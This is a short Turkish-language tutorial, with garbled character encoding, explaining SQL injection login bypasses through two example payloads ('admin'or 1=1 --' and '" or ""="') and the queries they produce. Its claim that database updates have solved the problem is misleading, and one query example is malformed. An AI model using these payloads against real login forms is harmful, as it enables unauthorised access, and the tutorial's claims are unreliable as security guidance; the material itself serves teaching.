Sql Ýnjection 

SQL Injection, SQL sorgusuna müdahale ederek bilgileri elde etmeye denir.
Ama Bu Sorunlar Veritabaný Teknolojilerin Kendisini Güncellemesi Ýle Sorun Giderilmiþtir


SQL Ýnjetion Yöntemleri


1=1 Yöntem

Kullanýcý Adi ve Þifre Bölümünde Yanlýþ Bir Bilgi Girilmedigi Sürece
2 Ýnput Degerinden True Bilgisi Döner Yukarýdaki 1=1 Yöntemi ise
1 Her zaman 1'e Eþit Olduðu için Yine True Deðeri Döner

 -------------------------------------|
| Kullanici Adý :   admin'or 1=1 --   |
|-------------------------------------|
| Sifre :           12345             |
|-------------------------------------|

Yukarýda ki Kodda Kullanici Adi Admin veya  1=1(True) Ýse Giriþ Yaptýr
Sondaki Tire Ýse -- Program Kalan Satýrý Ýþlemez ve Sifre Bölümüz Girmez

Sql Karþýlýgý 

SELECT * FROM User WHERE UserId = admin OR 1=1 --;
 


" or ""="  Yöntem

 -------------------------------------|
| Kullanici Adý :   " or ""="         |
|-------------------------------------|
| Sifre :           " or ""="         |
|-------------------------------------|


SELECT * FROM Users WHERE Name ="" or ""="" AND Pass ="" or ""=""
Yukarýdaki " or ""="  Kodu Sql de Users Tablosunda ki Tüm Degeleri Döndürür
OR "" = "" True Bilgisi Döndürdügü Ýçin.
